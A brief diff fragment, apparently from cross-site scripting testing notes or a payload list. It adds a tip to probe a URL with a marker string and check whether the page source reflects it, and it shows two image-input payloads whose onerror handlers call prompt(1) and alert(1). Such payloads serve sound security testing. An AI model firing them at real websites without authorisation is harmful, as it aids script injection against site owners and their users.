@@ -1,4 +1,6 @@
 ```
+Try url/?testtest // check in source for testtest
+
 <input type=image src onerror=prompt(1)>
 <input type=image src onerror="alert(1)">
 
